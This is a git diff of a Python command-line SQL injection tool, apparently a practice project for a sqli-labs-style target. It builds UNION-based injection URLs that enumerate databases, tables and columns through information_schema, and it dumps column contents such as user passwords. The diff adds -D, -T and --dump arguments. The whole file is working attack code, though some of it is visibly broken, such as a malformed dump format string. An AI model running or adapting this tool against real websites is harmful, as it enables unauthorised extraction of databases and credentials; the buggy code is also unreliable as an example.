@@ -1,9 +1,9 @@
 # coding:utf-8
 
+import sys
+
 import requests
 from bs4 import BeautifulSoup
-from bs4 import NavigableString
-import sys
 import base
 
 
@@ -87,9 +87,9 @@ class error_injection(base.injection):
             for tag in html_doc.find_all(color="#99FF00"):
                 print("[*]database name is: %s " % str(((tag.next).split(":", 1))[1]))
 
-    def injection_tablename(self, base_url):
+    def injection_tablename(self, base_url, database):
         sqli_url = base_url.replace("null",
-                                    "(select group_concat(table_name) from information_schema.tables where table_schema='sys')")
+                                    "(select group_concat(table_name) from information_schema.tables where table_schema='%s')" % database)
         #    print(sqli_url)
         rep = requests.get(url=sqli_url)
         result = rep.text
@@ -114,8 +114,8 @@ class error_injection(base.injection):
             for tag in html_doc.find_all(color="#99FF00"):
                 print("[*]column name is: %s " % str(((tag.next).split(":", 1))[1]))
 
-    def dump(self, base_url, inpu):
-        sqli_url = base_url.replace("null", "(select group_concat(%s) from security.users)" % inpu)
+    def dump(self, base_url, database, table, column):
+        sqli_url = base_url.replace("null", "(select group_concat(%s) from $s.%s)" % {database, table, column})
         #   print (sqli_url)
         rep = requests.get(url=sqli_url)
         result = rep.text
@@ -123,7 +123,7 @@ class error_injection(base.injection):
         #  print(html_doc)
         if "Your Login name:" in result:
             for tag in html_doc.find_all(color="#99FF00"):
-                print("[*]%s name is: %s " % (inpu, str(((tag.next).split(":", 1))[1])))
+                print("[*]%s name is: %s " % (column, str(((tag.next).split(":", 1))[1])))
 
 
 def main():
@@ -131,48 +131,55 @@ def main():
     #   params = None
     #   print(sys.argv)
     #     for i in sys.argv:
-    if sys.argv[1] == "-h":
-        print("[*]**********************************************")
-        print("[*]this is a short help for you")
-        print("[*]use -u to add the url that you want to test ")
-        print("[*]if you want to get more help,use -hh")
-        print("[*]**********************************************")
-    elif sys.argv[1] == "-hh":
-        print("[*]**********************************************")
-        print("[*]使用-u后加想要注入的url，如果存在注入，程序会有返回")
-        print("[*]使用-D获取需要注入网站的数据库")
-        print("[*]使用-T获取需要注入的网站的表")
-        print("[*]使用-C获取需要注入的网站的字段名")
-        print("[*]使用-dump获取字段内的内aa容")
-        print("[*]**********************************************")
-    elif sys.argv[1] == "":
-        print("no input")
-    elif sys.argv[1] == "-u":
-        base_url = sys.argv[2]
-        injection = error_injection(base_url)
-        result = injection.check()
-        print(result)
+    if (len(sys.argv) == 1):
+        print("input string!!!!!!!!")
+    else:
+        if sys.argv[1] == "-h":
+            print("[*]**********************************************")
+            print("[*]this is a short help for you")
+            print("[*]use -u to add the url that you want to test ")
+            print("[*]if you want to get more help,use -hh")
+            print("[*]**********************************************")
+
+        elif sys.argv[1] == "-hh":
+            print("[*]**********************************************")
+            print("[*]使用-u后加想要注入的url，如果存在注入，程序会有返回")
+            print("[*]使用-D获取需要注入网站的数据库")
+            print("[*]使用-T获取需要注入的网站的表")
+            print("[*]使用-C获取需要注入的网站的字段名")
+            print("[*]使用-dump获取字段内的内aa容")
+            print("[*]**********************************************")
+
+        elif sys.argv[1] == "":
+            print("no input")
+
+        elif sys.argv[1] == "-u":
+            base_url = sys.argv[2]
+            injection = error_injection(base_url)
+            result = injection.check()
+
+            #  print(result)
+
         if result:
+            #         print(len(sys.argv))
             union_number = injection.order_by()
             union_url = injection.union_select_url(union_number)
             # 获取第三个参数，注入出数据库名，表名，或者字段名，循环太多了，感觉自己好傻。
-            if sys.argv[3] != "":
-                if sys.argv[3]=="-D":
+
+            if len(sys.argv) > 3:
+                if sys.argv[3] == "-D" and (len(sys.argv) == 4):
                     injection.injection_dbname(union_url)
-                if sys.argv[3]=="-D" & sys.argv[5]=="-T" & sys.argv[4]!="":
-                        injection.injection_tablename(union_url)
-                elif sys.argv[4]=="":
-                    print("[*]database name is null!!!!")
-                elif sys.argv[3]=="-T":
-                    injection.injection_columns(union_url)
+                elif sys.argv[3] == "-D" and sys.argv[5] == "-T" and len(sys.argv) < 8:
+                    injection.injection_tablename(union_url, sys.argv[4])
+                elif sys.argv[3] == "-D" and sys.argv[5] == "-T" and sys.argv[7] == "--dump" and sys.argv[4] != "" and \
+                        sys.argv[
+                            6] != "":
+                    print("[*]dump data....")
+                    injection.dump(union_url, sys.argv[4], sys.argv[6], sys.argv[8])
 
-                    injection.dump(union_url, "password")
-            else:
-                print("[*]you must input the parameter for injection")
-                print("[*]exit")
         else:
-            print("[*]that url look like no injection,maybe try more url")
 
+            print("[*]that url look like no injection,maybe try more url")
 
 
 #  except:
